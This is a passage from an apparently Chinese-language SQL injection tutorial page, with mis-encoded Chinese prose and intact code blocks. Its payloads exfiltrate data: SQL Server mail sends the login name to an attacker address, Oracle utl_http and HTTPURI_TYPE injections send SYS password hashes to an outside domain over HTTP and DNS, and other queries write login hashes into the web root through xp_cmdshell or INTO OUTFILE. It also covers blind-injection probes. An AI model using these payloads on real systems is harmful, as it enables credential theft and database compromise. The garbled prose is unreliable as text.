punctuation">.</span>sysmail_add_account_sp<span class="token variable">@account_name</span><span class="token operator">=</span><span class="token string">'MYACC'</span><span class="token punctuation">,</span><span class="token variable">@email_address</span><span class="token operator">=</span><span class="token string">'hacked@victim.com'</span><span class="token punctuation">,</span><span class="token variable">@display_name</span><span class="token operator">=</span><span class="token string">'mls'</span><span class="token punctuation">,</span><span class="token variable">@mailserver_name</span><span class="token operator">=</span><span class="token string">'smtp.victim.com'</span><span class="token punctuation">,</span><span class="token variable">@account_id</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- Create a new profile, MYPROFILE</span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_adci_profile_sp<span class="token variable">@profile_name</span><span class="token operator">=</span> <span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span><span class="token variable">@description</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">,</span> <span class="token variable">@profile_id</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- Bind the account to the profile</span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_add_profileaccount_sp <span class="token variable">@profile_name</span><span class="token operator">=</span><span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span><span class="token variable">@account_name</span><span class="token operator">=</span><span class="token string">'acc'</span><span class="token punctuation">,</span><span class="token variable">@sequence_number</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- Retrieve login</span><span class="token keyword">DECLARE</span> <span class="token variable">@b</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token variable">@b</span><span class="token operator">=</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">;</span><span class="token comment">-- Send the mail</span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sp_send_dbmail <span class="token variable">@profile_name</span><span class="token operator">=</span><span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span>@recipients<span class="token operator">=</span><span class="token string">'allyrbase@attacker.com'</span><span class="token punctuation">,</span> <span class="token variable">@subject</span><span class="token operator">=</span><span class="token string">' system user'</span><span class="token punctuation">,</span><span class="token variable">@body</span><span class="token operator">=</span><span class="token variable">@b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="Oracle-3"><a href="#Oracle-3" class="headerlink" title="Oracle"></a>Oracle</h5><p>UTL_SMTPæä¾›äº†ä¸€ç³»åˆ—å‡½æ•°æ¥å¯åŠ¨å¹¶ç®¡ç†ä¸€ä¸ªSMTPè¿æ¥ï¼šå…ˆä½¿ ç”¨UTL_SMTP.OPEN_CONNECTIONä¸æœåŠ¡å™¨å–å¾—è”ç³»ï¼Œä¹‹åä½¿ç”¨UTL_SMTP.HELLOå‘æœåŠ¡å™¨å‘é€â€œHELLOâ€æ¶ˆæ¯ï¼Œæ¥ç€åˆ†åˆ«ä½¿ç”¨UTL_SMTP.MAILå’ŒUTL_SMTP.RCPæŒ‡å®šå‘é€è€…å’Œæ¥æ”¶è€…ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨UTL_SMTP.DATAæŒ‡å®šæ¶ˆæ¯ï¼Œæœ€åä½¿ç”¨UTL_SMTP.QUITç»ˆæ­¢ä¼šè¯ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">UTL_MAIL<span class="token punctuation">.</span>SEND<span class="token punctuation">(</span>sender<span class="token punctuation">,</span> recipient<span class="token punctuation">,</span> cc<span class="token punctuation">,</span> bcc<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> mime_type<span class="token punctuation">,</span> priority<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="HTTP-DNS"><a href="#HTTP-DNS" class="headerlink" title="HTTP/DNS"></a>HTTP/DNS</h4><p>Oracle è¿˜æä¾›äº†ä¸¤ç§æ‰§è¡Œ HTTP è¯·æ±‚çš„æ–¹æ³•:UTL_ HTTP å’Œ HTTPURI TYPEoUTL_ HTTP åŒ…å’ŒHTTPURI_TYPEå¯¹è±¡ç±»å‹é»˜è®¤æˆæƒç»™äº†å…¬å…±è§’è‰²ï¼Œå¯ä»¥ç”±æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·æ‰§è¡Œæˆ–é€šè¿‡ SQLæ³¨å…¥åŠ ä»¥æ‰§è¡Œã€‚</p><p>è¦æƒ³å‘è¿œç¨‹ç³»ç»Ÿå‘é€SYSç”¨æˆ·çš„å“ˆå¸Œå£ä»¤ï¼Œå¯æ³¨å…¥ä¸‹åˆ—å­—ç¬¦ä¸²ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> l<span class="token operator">=</span>utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'http://www.orasploit.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥å€ŸåŠ©äºHTTPURI_TYPEå¯¹è±¡ç±»å‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span>HTTPURI_TYPE<span class="token punctuation">(</span><span class="token string">'http://www.orasploit.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getclob<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœSQLæŸ¥è¯¢å†™åœ¨URLå†…éƒ¨ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥é€šè¿‡åŸŸåç³»ç»Ÿ(Domain Name System,DNS)æŸ¥è¯¢æ¥å‘é€æ•°æ®(æœ€å¤§ä¸º64å­—èŠ‚)ã€‚è¯¥æŸ¥è¯¢ä½œç”¨äºå¤–éƒ¨ç«™ç‚¹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span> utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'http://www.'</span><span class="token operator">||</span><span class="token punctuation">(</span>selectpasswordfromdba_userswhererownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.orasploit.com/'</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h4><p>å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¶³å¤Ÿçš„å†™æ–‡ä»¶ç³»ç»Ÿçš„æƒé™ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥å°†æŸ¥è¯¢ç»“æœé‡å®šå‘åˆ°WebæœåŠ¡å™¨æ ¹ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä¹‹åä»–ä¾¿å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥æ­£å¸¸è®¿é—®è¯¥æ–‡ä»¶ã€‚</p><h5 id="SQL-Server-3"><a href="#SQL-Server-3" class="headerlink" title="SQL Server"></a>SQL Server</h5><p>æ£€ç´¢sql_loginsè¡¨ä¸­ç¬¬ä¸€ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œå“ˆå¸Œï¼Œå°†è¯¥å€¼é‡å®šå‘åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Declare needed variables</span><span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@hash</span> nvarchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">@fileid</span> <span class="token keyword">int</span><span class="token punctuation">;</span><span class="token comment">-- Take the username and password hash of the first user in sql_logins </span><span class="token comment">-- and store it into the variable @hash</span><span class="token keyword">SELECT</span> <span class="token keyword">top</span> <span class="token number">1</span> <span class="token variable">@hash</span> <span class="token operator">=</span> name <span class="token operator">+</span><span class="token string">'|'</span><span class="token operator">+</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins<span class="token punctuation">;</span> <span class="token comment">-- Create a FileSystemObject pointing to the location of the desired file</span><span class="token keyword">EXEC</span> sp_OACreate <span class="token string">'Scripting.FileSystemObject'</span><span class="token punctuation">,</span> <span class="token variable">@a</span> <span class="token keyword">OUT</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_OAMethod <span class="token variable">@a</span><span class="token punctuation">,</span><span class="token string">'OpenTextFile'</span><span class="token punctuation">,</span> <span class="token variable">@fileid</span> <span class="token keyword">OUT</span><span class="token punctuation">,</span> <span class="token string">'c:\inetpub\wwwroot\hash.txt'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- Write the @hash variable into that file</span><span class="token keyword">EXEC</span> sp_OAMethod <span class="token variable">@fileid</span><span class="token punctuation">,</span> <span class="token string">'WriteLine'</span><span class="token punctuation">,</span> <span class="token boolean">Null</span><span class="token punctuation">,</span> <span class="token variable">@hash</span><span class="token punctuation">;</span> <span class="token comment">-- Destroy the objects that are not needed anymore</span><span class="token keyword">EXEC</span> sp_OADestroy <span class="token variable">@fileid</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_OADestroy <span class="token variable">@a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨è‡ªå¸¦å·¥å…·bcp.exe</p><p>æ£€ç´¢æ•´å¼ sql_loginsè¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_cmdshell <span class="token string">'bcp "select * from sys.sql_logins" queryout c:\inetpub\wwwroot\hashes.txt -T -c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Mysql-2"><a href="#Mysql-2" class="headerlink" title="Mysql"></a>Mysql</h5><p>ä¸ºç¡®å®šç”¨æˆ·æ˜¯å¦æ‹¥æœ‰FILEæƒé™ï¼Œå¯ä½¿ç”¨ä¸‹é¢ä¸¤ç§æŸ¥è¯¢ä¹‹ä¸€è¿›è¡Œæµ‹è¯•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> file_priv <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span><span class="token string">'username'</span> <span class="token comment">-- MySQL 4/5</span><span class="token keyword">SELECT</span> grantee<span class="token punctuation">,</span>is_grantable <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges <span class="token keyword">WHERE</span> privilege_type <span class="token operator">=</span> <span class="token string">'file'</span> <span class="token operator">AND</span> grantee <span class="token operator">=</span><span class="token string">'username'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‡è®¾ç”¨æˆ·æ‹¥æœ‰è¿™æ ·çš„æƒé™ï¼Œè€Œä¸”çŸ¥é“Webç«™ç‚¹çš„æ ¹ç›®å½•ä¸º/webroot/ä¸”MySQLç”¨æˆ·èƒ½å¤Ÿå¯¹è¯¥ç›®å½•è¿›è¡Œå†™è®¿é—®ï¼Œé‚£ä¹ˆå¯æ³¨å…¥ä¸‹åˆ—æŸ¥è¯¢ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/webroot/tables.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Oracle-4"><a href="#Oracle-4" class="headerlink" title="Oracle"></a>Oracle</h5><p>åœ¨Oracleä¸­ï¼Œå¤§å¤šæ•°ç”¨äºè®¿é—®æ–‡ä»¶çš„æ–¹æ³•(UTL_FILEã€DBMS_LOBå¤–éƒ¨è¡¨å’ŒJava)éƒ½éœ€è¦ä¸€ä¸ªPL/SQLæ³¨å…¥æ¼æ´ï¼Œå› è€Œæ— æ³•è¢«ç”¨åˆ°SQLæ³¨å…¥åœºæ™¯ä¸­ã€‚</p><h5 id="åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šå®æ–½SQLæ³¨å…¥"><a href="#åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šå®æ–½SQLæ³¨å…¥" class="headerlink" title="åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šå®æ–½SQLæ³¨å…¥"></a>åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šå®æ–½SQLæ³¨å…¥</h5><p>SQLite</p><p>å»ºç«‹ç›‘å¬é€šä¿¡</p><h3 id="è‡ªåŠ¨åˆ©ç”¨SQLæ³¨å…¥"><a href="#è‡ªåŠ¨åˆ©ç”¨SQLæ³¨å…¥" class="headerlink" title="è‡ªåŠ¨åˆ©ç”¨SQLæ³¨å…¥"></a>è‡ªåŠ¨åˆ©ç”¨SQLæ³¨å…¥</h3><h4 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><p><a href="http://sqlmap.sourceforge.net/">http://sqlmap.sourceforge.net</a></p><h4 id="Bobcat"><a href="#Bobcat" class="headerlink" title="Bobcat"></a>Bobcat</h4><p><a href="http://www.northem-monkee.co.uk/projects/bobcat/bobcat.html">www.northem-monkee.co.uk/projects/bobcat/bobcat.html</a></p><h4 id="BSQL"><a href="#BSQL" class="headerlink" title="BSQL"></a>BSQL</h4><p><a href="http://code.google.eom/p/bsqlhacker/">http://code.google.eom/p/bsqlhacker/</a></p><h4 id="å…¶ä»–-1"><a href="#å…¶ä»–-1" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><ul><li><p>FG-Injection Framework (<a href="http://sourceforge.net/projects/injection-fwk/">http://sourceforge.net/projects/injection-fwk/</a>)</p></li><li><p>Havij (<a href="http://itsecteam.com/en/projects/projectl.htm">http://itsecteam.com/en/projects/projectl.htm</a>)</p></li><li><p>Sqllnjector (<a href="http://www.woanware.co.uk/?page_id=19">http://www.woanware.co.uk/?page_id=19</a>)</p></li><li><p>SQLGET (<a href="http://www.infbbytecom.ar/">www.infbbytecom.ar</a>)</p></li><li><p>Sqlsus (<a href="http://sqlsus.sourcefbrge.net/">http://sqlsus.sourcefbrge.net/</a>)</p></li><li><p>Pangolin (<a href="http://www.nosec-inc.com/en/products/pangolin/">http://www.nosec-inc.com/en/products/pangolin/</a>)</p></li><li><p>Absinthe (<a href="http://0x90.org/releases/absinthe/">http://0x90.org/releases/absinthe/</a>)</p></li></ul><h2 id="SQLç›²æ³¨åˆ©ç”¨"><a href="#SQLç›²æ³¨åˆ©ç”¨" class="headerlink" title="SQLç›²æ³¨åˆ©ç”¨"></a>SQLç›²æ³¨åˆ©ç”¨</h2><p>åœ¨å‘ç°ä¸€ä¸ªSQLæ³¨å…¥ç‚¹æ—¶ï¼Œåªè¿”å›ä¸€ä¸ªç®€å•é”™è¯¯æç¤ºï¼Œè¿”å›çš„å†…å®¹å¹¶ä¸èƒ½å®Œç¾çš„è¾¾åˆ°é¢„æœŸï¼Œè¿™æ—¶æˆ‘ä»¬èƒ½æ³¨å…¥ä¸åŒçš„å†…å®¹æ³¨å…¥äº§ç”Ÿä¸åŒå›åº”ï¼Œé€šè¿‡å·®å¼‚åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸï¼Œè¿™å°±æ˜¯SQLç›²æ³¨ï¼Œé€šå¸¸æ˜¯è‡ªåŠ¨åŒ–åˆ©ç”¨</p><h3 id="å¯»æ‰¾å¹¶ç¡®è®¤SQLç›²æ³¨"><a href="#å¯»æ‰¾å¹¶ç¡®è®¤SQLç›²æ³¨" class="headerlink" title="å¯»æ‰¾å¹¶ç¡®è®¤SQLç›²æ³¨"></a>å¯»æ‰¾å¹¶ç¡®è®¤SQLç›²æ³¨</h3><h4 id="å¼ºåˆ¶äº§ç”Ÿé€šç”¨é”™è¯¯"><a href="#å¼ºåˆ¶äº§ç”Ÿé€šç”¨é”™è¯¯" class="headerlink" title="å¼ºåˆ¶äº§ç”Ÿé€šç”¨é”™è¯¯"></a>å¼ºåˆ¶äº§ç”Ÿé€šç”¨é”™è¯¯</h4><p>é€šå¸¸æäº¤å•å¼•å·æ—¶æœ€å¸¸è§çš„é”™è¯¯æºæ˜¯å—æŸçš„SQLæŸ¥è¯¢</p><h4 id="æ³¨å…¥å¸¦å‰¯ä½œç”¨çš„æŸ¥è¯¢"><a href="#æ³¨å…¥å¸¦å‰¯ä½œç”¨çš„æŸ¥è¯¢" class="headerlink" title="æ³¨å…¥å¸¦å‰¯ä½œç”¨çš„æŸ¥è¯¢"></a>æ³¨å…¥å¸¦å‰¯ä½œç”¨çš„æŸ¥è¯¢</h4><p>æ³¨å…¥å‰¯ä½œç”¨çš„æŸ¥è¯¢æ˜¯ä¸ºäº†è®©æ”»å‡»è€…è§‚å¯Ÿåˆ°ï¼Œé€šå¸¸æ˜¯æ³¨å…¥æ—¶é—´å»¶è¿Ÿ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>pg_sleep<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> æ³¨å…¥ä¸åŒçš„å­—ç¬¦ä¸²äº§ç”Ÿä¸åŒçš„è¾“å‡º</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span>  <span class="token comment">-- æ°¸å‡</span><span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token comment">-- æ°¸çœŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æ‹†åˆ†ä¸å¹³è¡¡"><a href="#æ‹†åˆ†ä¸å¹³è¡¡" class="headerlink" title="æ‹†åˆ†ä¸å¹³è¡¡"></a>æ‹†åˆ†ä¸å¹³è¡¡</h4><p>åˆ†è§£åˆæ³•è¾“å…¥çš„æ“ä½œç§°ä¸ºæ‹†åˆ†ï¼Œå¹³è¡¡åˆ™ä¿è¯æœ€ç»ˆçš„æŸ¥è¯¢ä¸­ä¸ä¼šåŒ…å«ä¸å¹³è¡¡çš„ç»“å°¾å•å¼•å·ã€‚å…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šæ”¶é›†åˆæ³•çš„è¯·æ±‚å‚æ•°ï¼Œä¹‹åä½¿ç”¨SQLå…³é”®å­—å¯¹å®ƒä»¬è¿›è¡Œä¿®æ”¹ä»¥ä¿è¯ä¸åŸå§‹æ•°æ®ä¸åŒï¼Œ ä½†å½“æ•°æ®åº“è§£æå®ƒä»¬æ—¶ï¼ŒäºŒè€…çš„åŠŸèƒ½æ˜¯ç­‰ä»·çš„ã€‚</p><p>oracleä¸­<code>||</code>è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadB'</span><span class="token operator">||</span><span class="token string">'ob'</span><span class="token comment">-- è¿”å›ç»“æœæ˜¯ç›¸åŒçš„</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review authors<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">0x42</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'ob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'Bob'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å…¶ä¸­æ³¨å…¥äº†å­æŸ¥è¯¢ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥æ¢æˆå…¶ä»–çš„æ¼æ´ä»£ç </p><p><img src="https://z3.ax1x.com/2021/07/19/WJ4jpj.png" alt="WJ4jpj.png"></p><h4 id="å¸¸è§çš„SQLç›²æ³¨åœºæ™¯"><a href="#å¸¸è§çš„SQLç›²æ³¨åœºæ™¯" class="headerlink" title="å¸¸è§çš„SQLç›²æ³¨åœºæ™¯"></a>å¸¸è§çš„SQLç›²æ³¨åœºæ™¯</h4><p>1ï¼‰ æäº¤ä¸€ä¸ªå¯¼è‡´SQLæŸ¥è¯¢æ— æ•ˆçš„æ¼æ´æ—¶ä¼šè¿”å›ä¸€ä¸ªé€šç”¨çš„é”™è¯¯é¡µé¢ï¼Œè€Œæäº¤æ­£ç¡®çš„SQLæ—¶åˆ™ä¼šè¿”å›ä¸€ä¸ªå†…å®¹å¯è¢«é€‚åº¦æ§åˆ¶çš„é¡µé¢ã€‚è¿™ç§æƒ…å†µé€šå¸¸å‡ºç°åœ¨æ ¹æ®ç”¨æˆ·é€‰æ‹©æ¥æ˜¾ç¤ºä¿¡æ¯çš„é¡µé¢ä¸­ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªåŒ…å«idå‚æ•°ï¼ˆèƒ½å”¯ä¸€è¯†åˆ«æ•°æ®åº“ä¸­çš„å•†å“ï¼‰çš„é“¾æ¥æˆ–è€…æäº¤ä¸€ä¸ªæœç´¢è¯·æ±‚ã€‚å¯¹äºè¿™ä¸¤ç§æƒ…å†µï¼Œç”¨æˆ·å¯æ§åˆ¶é¡µé¢æä¾›çš„è¾“å‡ºï¼Œå› ä¸ºè¯¥é¡µé¢æ˜¯æ ¹æ®ç”¨æˆ·æä¾›çš„ä¿¡æ¯æ¥ç”Ÿæˆçš„ï¼Œæ¯”å¦‚æä¾›ä¸€ä¸ªäº§å“çš„idï¼Œè¯¥é¡µé¢è¿˜åŒ…å«äº†ä»å“åº”ä¸­è·å¾—çš„æ•°æ®ã€‚</p><p>å› ä¸ºé¡µé¢æä¾›äº†åé¦ˆä¿¡æ¯ï¼ˆè™½ç„¶ä¸æ˜¯ä»¥è¯¦ç»†çš„æ•°æ®åº“é”™è¯¯æ¶ˆæ¯æ–¹å¼ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨åŸºäºæ—¶é—´çš„ç¡®è®¤æ¼æ´ä»¥åŠèƒ½å¤Ÿä¿®æ”¹é¡µé¢æ˜¾ç¤ºæ•°æ®é›†çš„æ¼æ´ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªæ”»å‡»å¯èƒ½ä¼šæ˜¾ç¤ºé¦™çš‚æˆ–åˆ·å­çš„äº§å“æè¿°ï¼Œä»¥æŒ‡ç¤ºæ˜¯å¦æå–åˆ°äº† 0-bitæˆ–1-bitçš„æ•°æ®ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåªéœ€æäº¤ä¸€ä¸ªå•å¼•å·å°±è¶³ä»¥ç ´åSQLæŸ¥è¯¢å¹³è¡¡å¹¶å¼ºåˆ¶äº§ç”Ÿä¸€ä¸ªé€šç”¨çš„é”™è¯¯é¡µé¢ï¼Œè¿™å°†æœ‰åŠ©äºæ¨æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><p>2ï¼‰ æäº¤ä¸€ä¸ªå¯¼è‡´SQLæŸ¥è¯¢æ— æ•ˆçš„æ¼æ´æ—¶ä¼šè¿”å›ä¸€ä¸ªé€šç”¨çš„é”™è¯¯é¡µé¢ï¼Œè€Œæäº¤æ­£ç¡®çš„SQLæ—¶åˆ™ä¼šè¿”å›ä¸€ä¸ªå†…å®¹ä¸å¯æ§çš„é¡µé¢ã€‚å½“é¡µé¢åŒ…å«å¤šä¸ªSQLæŸ¥è¯¢ï¼Œä½†åªæœ‰ç¬¬ä¸€ä¸ªæŸ¥è¯¢å®¹æ˜“å—åˆ°æ”»å‡»ä¸”ä¸äº§ç”Ÿè¾“å‡ºæ—¶ä¼šç¢°åˆ°è¿™ç§æƒ…å†µã€‚è¿˜æœ‰ä¸€ç§åœºæ™¯ä¹Ÿä¼šå¼•å‘è¿™ç§æƒ…å†µï¼šSQLæ³¨å…¥ä½äº UPDATEæˆ–INSERTè¯­å¥ä¸­ï¼Œæ­¤æ—¶æäº¤çš„ä¿¡æ¯è™½ç„¶è¢«å†™å…¥æ•°æ®åº“ä¸­ä¸”ä¸äº§ç”Ÿè¾“å‡ºï¼Œä½†å´ä¼šäº§ç”Ÿé€šç”¨çš„é”™è¯¯ã€‚</p><p>ä½¿ç”¨å•å¼•å·äº§ç”Ÿçš„é€šç”¨é”™è¯¯é¡µé¢å¯èƒ½ä¼šæš´éœ²è¿™ç§é¡µé¢ï¼ˆä¸åŸºäºæ—¶é—´çš„æ¼æ´ç›¸åŒï¼‰ï¼Œä½†åŸºäºå†…å®¹çš„æ”»å‡»å´ä¸ä¼šã€‚</p><p>3ï¼‰ æäº¤å—æŸæˆ–ä¸æ­£ç¡®çš„SQLæ—¢ä¸ä¼šäº§ç”Ÿé”™è¯¯é¡µé¢ï¼Œä¹Ÿä¸ä¼šä»¥ä»»ä½•æ–¹å¼å½±å“é¡µé¢è¾“å‡ºã€‚å›  ä¸ºè¿™ç§ç±»å‹çš„SQLç›²æ³¨åœºæ™¯ä¸è¿”å›é”™è¯¯ï¼Œè€ŒåŸºäºæ—¶é—´çš„æ¼æ´æˆ–äº§ç”Ÿå¸¦å¤–å‰¯ä½œç”¨çš„æ¼æ´åˆ™æœ€æœ‰å¯èƒ½æˆåŠŸè¯†åˆ«æ˜“å—æ”»å‡»çš„å‚æ•°ã€‚</p><h4 id="SQLç›²æ³¨æŠ€æœ¯"><a 